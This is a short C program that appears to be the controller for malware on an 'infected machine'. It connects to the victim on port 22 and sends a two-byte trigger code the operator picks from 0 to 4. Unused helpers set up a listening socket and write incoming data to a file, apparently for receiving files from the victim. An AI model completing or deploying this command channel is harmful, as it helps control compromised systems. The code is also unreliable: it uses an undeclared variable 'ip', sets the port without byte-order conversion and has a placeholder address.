#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<unistd.h>
#include <stdlib.h>

#define DEFAULT_PORT 27015

short SocketCreate(void)
{
    short hSocket;
    printf("Create the socket\n");
    hSocket = socket(AF_INET, SOCK_STREAM, 0);
    return hSocket;
}
int BindCreatedSocket(int hSocket)
{
    int iRetval=-1;
    int ClientPort = 27015;
    struct sockaddr_in  remote= {0};
    /* Internet address family */
    remote.sin_family = AF_INET;
    /* Any incoming interface */
    remote.sin_addr.s_addr = htonl(INADDR_ANY);
    remote.sin_port = htons(ClientPort); /* Local port */
    iRetval = bind(hSocket,(struct sockaddr *)&remote,sizeof(remote));
    return iRetval;
}

int ParseInto(unsigned char* buf, int len, char* name){
    FILE* fd = fopen(name,"w");
    if(!fd) {
        free(buf);
        return -1;
    }
    int res = fwrite(buf,1, (size_t) len, fd);
    printf("%d", res);
    fclose(fd);
    free(buf);
    return 0;
}


int main(int argc, char *argv[])
{
    char ips[16] = ":-)"; // :-) IP of the "infected machine"
    //Accept and incoming connection

    struct sockaddr_in servaddr;
    int ConnectSocket, iResult;
    while(1)
    /* Open a socket for heartbeat connections in another thread*/
    {
        int tmp = 0;
        // Temporary choice of signature to send
        printf("waiting for input:\n0, 1, 2, 3, 4\n");
        scanf("%d", &tmp);
        printf("Connecting...\n");
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = inet_addr(ip);
        servaddr.sin_port = 22;
        printf("Pass 1\n");
        ConnectSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (ConnectSocket < 0){
            perror("failed to get socket desc");
            return 1;
        }
        printf("Pass 2\n");
        iResult = connect(ConnectSocket, (struct sockaddr* ) &servaddr, sizeof(servaddr));
        if(iResult < 0){
            perror("failed to connect");
            return -1;
        }
        printf("Pass 3\n");
        char txt[2] = {0xfb, tmp};
        iResult = send(ConnectSocket, txt, 2, 0);
        if (iResult < 0){
            perror("fail send");
            return 1;
        }

        close(ConnectSocket);
        break;

    }
    return 0;
}
